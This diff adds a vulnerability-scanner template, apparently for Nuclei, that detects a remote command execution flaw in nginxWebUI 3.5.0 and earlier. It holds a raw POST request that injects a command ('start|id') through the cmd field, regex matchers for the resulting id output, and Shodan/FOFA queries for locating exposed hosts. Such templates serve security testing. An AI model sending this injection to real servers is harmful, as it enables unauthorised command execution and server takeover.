@@ -1,0 +1,41 @@
+id: nginx-webui-rce
+
+info:
+  name: nginxWebUI ≤ 3.5.0 - Remote Command Execution
+  author: ritikchaddha
+  severity: critical
+  description: |
+    There is a command execution vulnerability in the nginxWebUI backend. After logging in to the backend, the attacker can execute any command to obtain server permissions.
+  reference: |
+    - https://forum.butian.net/article/243
+  metadata:
+    max-request: 1
+    shodan-query: title="nginxwebui"
+    fofa-query: title="nginxwebui"
+  tags: nginx,nginxwebui,webui,rce
+
+http:
+  - raw:
+      - |
+        POST /adminPage/remote/cmdOver HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        remoteId=local&cmd=start|id&interval=1
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502205cfca6db6b6255fba8967f3b6cc623577248af7f237c9a198a15ac0cf8a3cc60022100bcf068fd72d0e4f172d736f2f29a0806098b48f0785c74cf4048463804bd1770:922c64590222798bb761d5b6d8e72950
